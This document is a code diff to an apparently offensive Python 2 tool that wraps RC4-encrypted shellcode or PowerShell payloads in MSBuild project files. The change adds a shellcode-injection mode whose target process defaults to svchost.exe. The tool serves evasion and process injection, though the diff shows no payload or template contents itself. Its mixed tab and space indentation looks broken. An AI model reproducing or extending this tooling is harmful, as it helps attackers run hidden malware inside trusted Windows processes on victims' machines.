@@ -106,28 +106,35 @@ if __name__ == "__main__":
 	gen = Generator()
 	parser = argparse.ArgumentParser()
 	
-	parser.add_argument('-type', action='store', default="shellcode", help='Payload type (shellcode/powershell) default to: shellcode')
+	parser.add_argument('-type', action='store', default="shellcode", help='Payload type (shellcode/shellcode_inject/powershell) default to: shellcode')
 	parser.add_argument('-source', action='store', help='Path to the source file (raw shellcode or powershell script)', required=True)
 	parser.add_argument('-output', action='store', help='MSBuild output filename', required=True)
 	parser.add_argument('-arch', action='store', default='32', help='Shellcode architecture (32/64) default to: 32')
+        parser.add_argument('-processpath', action='store', default='c:\\\windows\\\system32\\\svchost.exe', help='Process filename path for shellcode inject default is: c:\\\windows\\\system32\\\svchost.exe (note for double \\\. use process matching the shellcode architecture!)')
 	parser.add_argument('-condition', action='store', default="", help='XML Compiling condition default (Check for USERDOMAIN) default is: none')
 	options = parser.parse_args()
 	
 	template_path = TEMPLATE
 	shellcode_arch = ""
 	data = ""
-		
+        shellcode_inject_path = options.processpath
+	
 	if options.type == "powershell":
 		template_path += "powershell.csproj"
-	else:
+	elif options.type == "shellcode":
 		template_path += "shellcode.csproj"
+        else:
+                template_path += "shellcode_inject.csproj"
 		
 	print "Generating the msbuild file using %s as the template" % template_path
 	
 	if options.arch == "64":
 		shellcode_arch = "64"
 		print "Generating a payload for a 64 bits shellcode! Don't forget to use the 64 bits version of msbuild.exe"
-	
+
+        if options.arch != "64" and options.type == "shellcode_inject":
+                print "Shellcode Injection Template is in use with 32 bits architecure! Don't forget to use 32 bits process to inject"
+                
 	gen.set_template(template_path)
 	rc4 = RC4()
 	key = gen.gen_rc4_key(32)
@@ -146,6 +153,7 @@ if __name__ == "__main__":
 	condition = options.condition
 	output = gen.set_condition(output, condition)
 	output = output.replace("[ARCH]", shellcode_arch)
+        output = output.replace("[PROCESSPATH]", shellcode_inject_path);
 	
 	try:
 		open(options.output, "wb").write(output)
